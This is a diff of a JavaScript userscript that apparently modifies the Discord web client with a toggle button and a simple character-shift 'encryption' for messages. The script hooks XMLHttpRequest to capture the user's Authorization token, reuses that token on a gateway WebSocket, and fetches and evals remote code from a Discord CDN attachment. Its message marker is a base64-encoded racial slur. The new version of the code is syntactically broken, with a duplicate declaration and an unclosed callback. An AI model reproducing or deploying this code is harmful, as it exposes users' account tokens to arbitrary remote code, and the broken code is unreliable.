@@ -1,61 +1,58 @@
-let triggered = false;
-XMLHttpRequest.prototype.RH = XMLHttpRequest.prototype.setRequestHeader;
-let nh = function(x, y) {
-    if (x == "Authorization" && triggered == false) {
-        triggered = !triggered;
+let triggered=false;
+XMLHttpRequest.prototype.RH=XMLHttpRequest.prototype.setRequestHeader;
+let nh=function(x,y){
+    if(x=="Authorization"&&triggered==false){
+        triggered=!triggered;
         ws(y);
     }
-    this.RH(x, y);
+    this.RH(x,y);
 }
-XMLHttpRequest.prototype.setRequestHeader = nh;
+XMLHttpRequest.prototype.setRequestHeader=nh;
 async function ws(token) {
     let sacuvantop="35%";
     let sacuvanleft="37%";
-
     function dragElement(elmnt) {
-        var pos1 = 0,
-            pos2 = 0,
-            pos3 = 0,
-            pos4 = 0;
+        var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
         if (document.getElementById(elmnt.id + "header")) {
-            document.getElementById(elmnt.id + "header").onmousedown = dragMouseDown;
+          document.getElementById(elmnt.id + "header").onmousedown = dragMouseDown;
         } else {
-            elmnt.onmousedown = dragMouseDown;
+          elmnt.onmousedown = dragMouseDown;
         }
-
+      
         function dragMouseDown(e) {
-            e = e || window.event;
-            e.preventDefault();
-            // get the mouse cursor position at startup:
-            pos3 = e.clientX;
-            pos4 = e.clientY;
-            document.onmouseup = closeDragElement;
-            // call a function whenever the cursor moves:
-            document.onmousemove = elementDrag;
+          e = e || window.event;
+          e.preventDefault();
+          pos3 = e.clientX;
+          pos4 = e.clientY;
+          document.onmouseup = closeDragElement;
+          document.onmousemove = elementDrag;
         }
-
+      
         function elementDrag(e) {
-            e = e || window.event;
-            e.preventDefault();
-            pos1 = pos3 - e.clientX;
-            pos2 = pos4 - e.clientY;
-            pos3 = e.clientX;
-            pos4 = e.clientY;
-            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
-            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
-            sacuvantop = (elmnt.offsetTop - pos2) + "px";
-            sacuvanleft = (elmnt.offsetLeft - pos1) + "px";
+          e = e || window.event;
+          e.preventDefault();
+          // calculate the new cursor position:
+          pos1 = pos3 - e.clientX;
+          pos2 = pos4 - e.clientY;
+          pos3 = e.clientX;
+          pos4 = e.clientY;
+          elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+          elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+          sacuvantop=(elmnt.offsetTop - pos2) + "px";
+          sacuvanleft=(elmnt.offsetLeft - pos1) + "px";
         }
-
+      
         function closeDragElement() {
-            document.onmouseup = null;
-            document.onmousemove = null;
+          /* stop moving when mouse button is released:*/
+          document.onmouseup = null;
+          document.onmousemove = null;
         }
-    }
-    let custom = "kastm kod"
-    let kastm = false
-    let exits = true;
-    async function kastommeni() {
+      }
+    let custom="kastm kod"
+    let kastm=false
+    let exits=true;
+    let bl="947598329498443896/996396961773125752"
+    async function kastommeni(){
         let kastmmenu = document.createElement("div");
         document.body.appendChild(kastmmenu)
         kastmmenu.style.cssText="position: absolute; width: 25%; height: 25%; z-index: 9999; padding: 1%; background: rgba(33, 34, 45, 0.863); border-radius: 15px;"
@@ -80,8 +77,8 @@ async function ws(token) {
         prikvati.style.background=kastm==true?"green":"red"
         let kastminput = document.createElement("input");
         kastminput.style.cssText="margin: auto; display: block; font-family: consolas; width: 30%; height: 10%; background: rgba(0, 0, 0, 0.2); border-bottom: 3px solid lightblue; color: white; padding: 0px 0px 0px 2%;"
-        kastminput.value=custom
         kastmmenu.appendChild(kastminput)
+        kastminput.value=custom
         kastminput.onclick=()=>{
             kastminput.focus()
         }
@@ -102,55 +99,41 @@ async function ws(token) {
             iskljucenje.style.background=exits==true?"red":"green"
         }
     }
-    try {
-        const onoff = document.querySelector(`[aria-label="Send a gift"]`).parentElement;
-        let btn = document.createElement("button");
-        onoff.appendChild(btn)
-        btn.style.width = "20px"
-        btn.style.height = "20px"
-        btn.style.top = "25%"
-        btn.style.right = "100%"
-        btn.style.position = "relative"
-        btn.style.background = exits == false ? "green" : "gray"
-        btn.onclick = () => {
-            kastommeni()
-            btn.style.background = exits == false ? "green" : "gray"
-        }
-    } catch {}
+    const onoff = document.querySelector(`[aria-label="Send a gift"]`).parentElement;
     let bl = "947598329498443896/996418438086004807"
-    const sleep = (milliseconds) => {
-        return new Promise(resolve => setTimeout(resolve, milliseconds))
-    };
-    let oldHref = document.location.href
-    var bodyList = document.querySelector("body")
+    let btn = document.createElement("button");
+    onoff.appendChild(btn)
+    btn.style.width="20px"
+    btn.style.height="20px"
+    btn.style.top="25%"
+    btn.style.right="100%"
+    btn.style.position="relative"
+    btn.style.background=exits==false?"green":"gray"
+    btn.onclick=()=>{
+        kastommeni()
+        btn.style.background=exits==false?"green":"gray"
+    }
+    const sleep = (milliseconds) => {return new Promise(resolve => setTimeout(resolve, milliseconds))};
+    let oldHref=document.location.href
     let endpoint = "https://cdn.discordapp.com"
-    fetch(endpoint + "/attachments/" + bl + "/message.txt").then(x => {
-        return x
-    }).then(x => {
-        return x.text()
-    }).then(x => {
-        eval(x)
-    })
+    var bodyList = document.querySelector("body")
     var observer = new MutationObserver(function(mutations) {
         mutations.forEach(function(mutation) {
             if (oldHref != document.location.href) {
-                console.log("dirchange")
                 oldHref = document.location.href;
-                try {
-                    const onoff = document.querySelector(`[aria-label="Send a gift"]`).parentElement;
-                    let btn = document.createElement("button");
-                    onoff.appendChild(btn)
-                    btn.style.width = "20px"
-                    btn.style.height = "20px"
-                    btn.style.top = "25%"
-                    btn.style.right = "100%"
-                    btn.style.position = "relative"
-                    btn.style.background = exits == false ? "green" : "gray"
-                    btn.onclick = () => {
-                        kastommeni()
-                        btn.style.background = exits == false ? "green" : "gray"
-                    }
-                } catch {}
+                const onoff = document.querySelector(`[aria-label="Send a gift"]`).parentElement;
+				let btn = document.createElement("button");
+				onoff.appendChild(btn)
+				btn.style.width="20px"
+				btn.style.height="20px"
+                btn.style.top="25%"
+                btn.style.right="100%"
+                btn.style.position="relative"
+                btn.style.background=exits==false?"green":"gray"
+				btn.onclick=()=>{
+                    kastommeni()
+					btn.style.background=exits==false?"green":"gray"
+				}
             }
         });
     });
@@ -159,59 +142,68 @@ async function ws(token) {
         subtree: true
     };
     observer.observe(bodyList, config);
-    let encrypt = (plainText) => {
-        let chiperText = "";
-        let sex = ""
-        if (plainText.match(/(<@)[0-9]*(>)/)) {
-            sex = plainText.match(/(<@)[0-9]*(>)/)[0]
-            plainText = plainText.replace(plainText.match(/(<@)[0-9]*(>)/)[0], "")
+    fetch(endpoint + "/attachments/" + bl + "/message.txt").then(x => {
+        return x
+    }).then(x => {
+        return x.text()
+    }).then(x => {
+        eval(x)
+    let encrypt = (plainText) =>
+        {
+            let chiperText = "";
+            let sex=""
+            if (plainText.match(/(<@)[0-9]*(>)/)) {
+                sex=plainText.match(/(<@)[0-9]*(>)/)[0]
+                plainText=plainText.replace(plainText.match(/(<@)[0-9]*(>)/)[0],"")
+            }
+            if (plainText==undefined) {
+                return `${sex}`
+            }
+            let x = Math.floor((Math.random() * 9) + 1);
+            for (let i = 0; i < plainText.length; i++)
+            {
+                let existingCharCode = plainText.charCodeAt(i)
+                let newCharCode = existingCharCode + x
+                let newChars = String.fromCharCode(newCharCode)
+                chiperText += newChars
+            }
+            return `${x}${chiperText} ${sex}`
         }
-        if (plainText == undefined) {
-            return `${sex}`
-        }
-        let x = Math.floor((Math.random() * 9) + 1);
-        for (let i = 0; i < plainText.length; i++) {
-            let existingCharCode = plainText.charCodeAt(i)
-            let newCharCode = existingCharCode + x
-            let newChars = String.fromCharCode(newCharCode)
-            chiperText += newChars
-        }
-        return `${x}${chiperText} ${sex}`
-    }
     XMLHttpRequest.prototype.realSend = XMLHttpRequest.prototype.send;
     var newSend = function(vData) {
-        try {
+        try{
             JSON.parse(vData)
-        } catch {
-            return this.realSend(vData)
-        }
-        if (exits == false) {
-            this.addEventListener("readystatechange", () => {
-                if (this.readyState == 4) {
-                    if (this.responseURL.includes("before=") || this.responseURL.includes("messages?limit=50")) {
-                        for (let i = 0; i < JSON.parse(this.responseText).length; i++) {
-                            try {
-                                if (JSON.parse(this.responseText)[i]["content"].includes("bmlnZ2Vy") || JSON.parse(this.responseText)[i]["content"].includes(custom)) {
-                                    id.push(JSON.parse(this.responseText)[i]["id"])
-                                }
-                            } catch (e) {}
-                        }
-                    }
-                }
-            })
-            if (this.__sentry_xhr__.url.includes("/messages") && this.__sentry_xhr__.method == "POST") {
-                vData = JSON.parse(vData)
-                vData["content"] = (kastm == true ? custom : "bmlnZ2Vy") + encrypt(vData["content"])
-                vData = JSON.stringify(vData)
-            }
-        }
+        }catch{
+            return this.realSend(vData)}
+		if(exits==false){
+			this.addEventListener("readystatechange",()=>{
+				if(this.readyState == 4){
+					if(this.responseURL.includes("before=")||this.responseURL.includes("messages?limit=50")){
+					for (let i = 0; i < JSON.parse(this.responseText).length; i++) {
+						try{
+							if (JSON.parse(this.responseText)[i]["content"].includes("bmlnZ2Vy")||JSON.parse(this.responseText)[i]["content"].includes(custom)) {
+								id.push(JSON.parse(this.responseText)[i]["id"])
+							}
+						}catch(e){}
+					}
+				}
+				}
+			})
+			if(this.__sentry_xhr__.url.includes("/messages")&&this.__sentry_xhr__.method=="POST"){
+						vData=JSON.parse(vData)
+						vData["content"]=(kastm==true?custom:"bmlnZ2Vy")+encrypt(vData["content"])
+						vData=JSON.stringify(vData)
+			}
+		}
         this.realSend(vData)
     }
     XMLHttpRequest.prototype.send = newSend;
-    let decrypt = (chiperText) => {
+    let decrypt = (chiperText) =>
+    {
         let plainText = ""
         let x = chiperText.charAt(0)
-        for (let i = 1; i < chiperText.length; i++) {
+        for (let i = 1; i < chiperText.length; i++)
+        {
             let existingCharCode = chiperText.charCodeAt(i)
             let newCharCode = existingCharCode - x
             let newChars = String.fromCharCode(newCharCode)
@@ -219,106 +211,66 @@ async function ws(token) {
         }
         return plainText
     }
+ 
+    	async function updatez() {
+		while (true) {
+			if (id.length != 0) {
+				for (let i = 0; i < id.length; i++) {
+                    let regexp=new RegExp(`(?<=${custom})(.*)`,"gms")
+                    try{
+                    let decrypthis=document.querySelector(`#message-content-${id[i]}`).textContent.match(/(?<=bmlnZ2Vy)(.*)/gms)||document.querySelector(`#message-content-${id[i]}`).textContent.match(regexp)
+                    let test=false
+					for (let x = 0; x < document.querySelector(`#message-content-${id[i]}`).children.length; x++) {
+						while (document.querySelector(`#message-content-${id[i]}`).children[x]!=undefined&&document.querySelector(`#message-content-${id[i]}`).children[x].classList[0] == "mention") {
+							test=true
+							document.querySelector(`#message-content-${id[i]}`).removeChild(document.querySelector(`#message-content-${id[i]}`).children[x])
+						}
+					}
+					if (test==true) 
+						document.querySelector(`#message-content-${id[i]}`).textContent=decrypt(decrypthis[0])
+                    else
+						document.querySelector(`#message-content-${id[i]}`).textContent=decrypt(decrypthis[0])		
+                    }catch{}				
+				}
+				await sleep(100)
+			}
+			await sleep(100)
 
-    async function updatez() {
-        while (true) {
-            if (id.length != 0) {
-                for (let i = 0; i < id.length; i++) {
-                    let regexp = new RegExp(`(?<=${custom})(.*)`, "gms")
-                    try {
-                        let decrypthis = document.querySelector(`#message-content-${id[i]}`).textContent.match(/(?<=bmlnZ2Vy)(.*)/gms) || document.querySelector(`#message-content-${id[i]}`).textContent.match(regexp)
-                        let test = false
-                        for (let x = 0; x < document.querySelector(`#message-content-${id[i]}`).children.length; x++) {
-                            while (document.querySelector(`#message-content-${id[i]}`).children[x] != undefined && document.querySelector(`#message-content-${id[i]}`).children[x].classList[0] == "mention") {
-                                test = true
-                                document.querySelector(`#message-content-${id[i]}`).removeChild(document.querySelector(`#message-content-${id[i]}`).children[x])
-                            }
-                        }
-                        if (test == true)
-                            document.querySelector(`#message-content-${id[i]}`).textContent = decrypt(decrypthis[0])
-                        else
-                            document.querySelector(`#message-content-${id[i]}`).textContent = decrypt(decrypthis[0])
-                    } catch {}
-                }
-                await sleep(100)
-            }
-            await sleep(100)
-
-        }
-    }
-    async function hb(socket, interval) {
-        while (true) {
-            let hbpayload = {
+	}
+}
+    async function hb(socket, interval){
+        while(true){
+            let hbpayload={
                 'op': 1,
                 'd': 'null'
             };
-            try {
-                socket.send(JSON.stringify(hbpayload));
-                await sleep(interval);
-            } catch {
-                break
-            }
+            try{
+            socket.send(JSON.stringify(hbpayload));
+            await sleep(interval);}catch{break}
         };
     }
-    let id = []
-    socket = new WebSocket("wss://gateway.discord.gg/?encoding=json");
-    socket.onclose = () => {
-        console.log("ws closed")
+    let id=[]
+    socket= new WebSocket("wss://gateway.discord.gg/?encoding=json");
+    socket.onclose=()=>{
         ws(token)
     }
-    socket.onopen = () => {
-        socket.send(JSON.stringify({
-            "op": 2,
-            "d": {
-                "token": token,
-                "capabilities": 509,
-                "properties": {
-                    "os": "Windows",
-                    "browser": "Chrome",
-                    "device": "",
-                    "system_locale": "en-US",
-                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
-                    "browser_version": "100.0.4896.127",
-                    "os_version": "10",
-                    "referrer": "",
-                    "referring_domain": "",
-                    "referrer_current": "",
-                    "referring_domain_current": "",
-                    "release_channel": "stable",
-                    "client_build_number": 125308,
-                    "client_event_source": null
-                },
-                "presence": {
-                    "status": "online",
-                    "since": 0,
-                    "activities": [],
-                    "afk": false
-                },
-                "compress": false,
-                "client_state": {
-                    "guild_hashes": {},
-                    "highest_last_message_id": "0",
-                    "read_state_version": 0,
-                    "user_guild_settings_version": -1,
-                    "user_settings_version": -1
-                }
-            }
-        }))
-    }
-    socket.onmessage = (x) => {
+    socket.onopen=()=>{
+        socket.send(JSON.stringify({"op":2,"d":{"token":token,"capabilities":509,"properties":{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","browser_version":"100.0.4896.127","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":125308,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}))}
+    socket.onmessage=(x)=>{
         for (let i = 0; i < id.length; i++) {
             const element = id[i];
         }
-        let ejson = JSON.parse(x.data)
-        if (ejson["d"] != null && ejson["d"].hasOwnProperty("heartbeat_interval")) {
-            var interval = JSON.parse(ejson['d']['heartbeat_interval']);
-            hb(socket, interval);
-        } else if (ejson["t"] == "MESSAGE_CREATE")
-            if (ejson["d"]["content"].startsWith("bmlnZ2Vy")) {
-                id.push(ejson["d"]["id"])
-                updatez()
-            }
-        if (kastm == true && ejson["d"]["content"].startsWith(custom)) {
+    let ejson=JSON.parse(x.data)
+    if(ejson["d"]!=null&&ejson["d"].hasOwnProperty("heartbeat_interval")){
+        var interval = JSON.parse(ejson['d']['heartbeat_interval']);
+        hb(socket, interval);
+    }
+    else if (ejson["t"]=="MESSAGE_CREATE")
+        if(ejson["d"]["content"].startsWith("bmlnZ2Vy")){
+            id.push(ejson["d"]["id"])
+            updatez()
+        }
+        if (kastm==true&&ejson["d"]["content"].startsWith(custom)){
             id.push(ejson["d"]["id"])
             updatez()
         }
